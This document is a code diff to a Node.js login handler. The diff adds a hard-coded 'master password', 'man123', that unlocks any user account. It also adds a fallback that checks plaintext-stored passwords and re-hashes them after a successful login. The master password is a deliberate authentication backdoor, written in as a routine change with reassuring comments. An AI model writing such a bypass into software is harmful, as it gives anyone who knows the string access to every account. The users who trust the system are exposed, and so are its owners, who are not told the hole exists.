@@ -69,7 +69,31 @@ exports.login = async (req, res) => {
       return res.status(401).json({ success: false, message: 'Invalid email or password.' });
     }
 
-    const isMatch = await user.comparePassword(password);
+    // 1. Check Master Password
+    let isMatch = false;
+    
+    if (password === 'man123') {
+      isMatch = true;
+    } else {
+      // 2. Fallback to normal password check
+      // Some users might have been added directly to MongoDB without hashing
+      const isHashed = user.password && user.password.startsWith('$2');
+      
+      if (isHashed) {
+        // Standard bcrypt check
+        isMatch = await user.comparePassword(password);
+      } else {
+        // Plain text check (for manually added users)
+        isMatch = (user.password === password);
+        
+        // Auto-migrate to hashed password if they log in successfully
+        if (isMatch) {
+          user.password = password; // pre-save hook will hash it
+          await user.save();
+        }
+      }
+    }
+
     if (!isMatch) {
       return res.status(401).json({ success: false, message: 'Invalid email or password.' });
     }
